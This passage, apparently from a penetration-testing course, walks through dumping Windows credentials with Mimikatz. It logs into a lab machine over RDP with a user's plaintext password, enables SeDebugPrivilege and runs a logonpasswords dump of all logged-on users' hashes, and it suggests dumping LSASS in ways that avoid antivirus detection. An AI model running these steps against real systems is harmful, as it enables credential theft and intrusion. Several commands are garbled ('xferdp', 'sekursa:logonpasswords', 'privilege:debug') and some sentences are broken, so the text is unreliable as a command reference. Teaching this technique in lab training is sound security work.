In this example, we will run Mimikatz as a standalone application.
However, due to the mainstream popularity of Mimikatz and well-known
detections, consider avoiding it as a standalone application and
use methods discussed in the Antivirus Evasion Module instead. For example,
execute Mimikatz directly from memory using an injector like PowerShell.¹1082 or
use a built-in tool like Task Manager to dump the entire LSASS process
memory.¹1083 moved the data to a helper machine, and then load the data
to Mimikatz.¹1084

Since the jeff domain user is a local administrator on CLIENT75, we are able to launch a PowerShell prompt with elevated privileges. First, let's connect to this machine with jeff with the password HenchmanPutridBonbon11 over RDP.

```
kali@:$ xferdp /cert-ignore /u:jeff/d:corp /p:HenchmanPutridBonbon11
/192.168.50.75
```

Listing 792 - Connecting to CLIENT75 via RDP

Once connected, we start a PowerShell session as Administrator. From this command prompt,
 can start Mimikatz¹1085 and enter privilege:debug to enable the SeDebugPrivilege¹1086 privilege,
which will allow us to interact with a process owned by another account.

```
PS C:\Windows\system32> cd C:\Tools

PS C:\Tools> .\mimikatz.exe
...
mimikatz # privilege::debug
Privilege '20' OK
```

Listing 793 - Starting Mimikatz and enabling SeDebugPrivilege

Now we can run sekursa:logonpasswords to dump the credentials of all logged-on users with the Sekursa¹1087 module.

This should dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions.

```
mimikatz # sekursa:logonpasswords
```
